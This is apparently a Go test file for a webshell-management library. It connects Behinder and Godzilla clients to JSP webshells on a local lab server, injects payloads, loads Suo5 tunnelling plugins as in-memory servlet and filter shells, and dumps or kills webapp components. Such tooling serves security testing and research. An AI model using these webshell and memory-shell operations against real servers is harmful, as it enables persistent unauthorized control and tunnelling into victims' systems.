package wsm

import (
	"fmt"
	"github.com/davecgh/go-spew/spew"
	"github.com/stretchr/testify/assert"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"regexp"
	"strings"
	"testing"
)

func TestNewWebShell(t *testing.T) {

	url := "http://127.0.0.1:8080/S2-032/bx3.jsp"
	//url = "http://127.0.0.1:8080/S2-032/bs4.jsp"
	url = "http://127.0.0.1:8080/S2-032/bs4-json.jsp"
	bx, _ := NewBehinderManager(url,
		SetSecretKey("rebeyond"),
		SetShellScript("jsp"),
		SetProxy("http://127.0.0.1:9999"),
	)
	bx.Encoder(func(reqBody []byte) ([]byte, error) {
		//jsonStr := `{"id":"1","body":{"user":"lucky"}}`
		//encodedData := base64.StdEncoding.EncodeToString(reqBody)
		//encodedData = strings.ReplaceAll(encodedData, "+", "<")
		//encodedData = strings.ReplaceAll(encodedData, "/", ">")
		//jsonStr = strings.ReplaceAll(jsonStr, "lucky", encodedData)
		//return []byte(jsonStr), nil
		return reqBody, nil
	})
	bx.Decoder(func(rspBody []byte) ([]byte, error) {
		//rspBody = rspBody[26 : len(rspBody)-3]
		//decodedData, err := base64.StdEncoding.DecodeString(strings.ReplaceAll(strings.ReplaceAll(string(rspBody), "<", "+"), ">", "/"))
		//if err != nil {
		//	return nil, err
		//}
		//return decodedData, nil
		return rspBody, nil
	})
	ping, err := bx.Ping()
	if err != nil {
		return
	}
	fmt.Println(ping)
}

func TestInjectSuo5Servlet(t *testing.T) {
	url := "http://127.0.0.1:8080/tomcatLearn_war_exploded/shell.jsp"
	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes())
	g := godzillaShell.(*Godzilla)
	err := g.InjectPayload()
	if err != nil {
		panic(err)
	}
	ping, err := godzillaShell.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)
	plugin, err := g.LoadSuo5Plugin("go0p", "servlet", "/suo5")
	if err != nil {
		panic(err)
	}

	spew.Dump(plugin)
}

func TestInjectSuo5Filter(t *testing.T) {
	url := "http://127.0.0.1:8080/tomcatLearn_war_exploded/shell.jsp"
	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes())
	g := godzillaShell.(*Godzilla)

	err := g.InjectPayload()
	if err != nil {
		panic(err)
	}
	ping, err := godzillaShell.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)

	plugin, err := g.LoadSuo5Plugin("go0p", "filter", "/*")
	if err != nil {
		panic(err)
	}

	spew.Dump(plugin)
}

func TestInjectWebappComponent(t *testing.T) {
	url := "http://127.0.0.1:8080/tomcatLearn_war_exploded/shell.jsp"
	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes())
	g := godzillaShell.(*Godzilla)
	err := g.InjectPayload()
	if err != nil {
		panic(err)
	}
	ping, err := godzillaShell.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)

	plugin, err := g.LoadScanWebappComponentInfoPlugin("memshellScan")
	if err != nil {
		panic(err)
	}

	plugin, err = g.ScanWebappComponentInfo()
	if err != nil {
		panic(err)
	}
	spew.Dump(plugin)
	assert.True(t, strings.Contains(string(plugin), "b3JnLmFwYWNoZS5qYXNwZXIuc2VydmxldC5Kc3BTZXJ2bGV0"))

	plugin, err = g.DumpWebappComponent("com.example.HelloServlet")
	pattern := regexp.MustCompile(`"classBytes":\s*"([^"]+)"`)
	plugin = pattern.FindSubmatch(plugin)[1]
	if err != nil {
		panic(err)
	}

	plugin, _ = codec.DecodeBase64(string(plugin))
	plugin = []byte(codec.EncodeToHex(plugin))

	spew.Dump(plugin)

	assert.True(t, strings.Contains(string(plugin), "cafebabe"))

	plugin, err = g.KillWebappComponent("filter", "HelloFilter")
	if err != nil {
		panic(err)
	}
	spew.Dump(plugin)
	assert.True(t, strings.Contains(string(plugin), "success"))

}
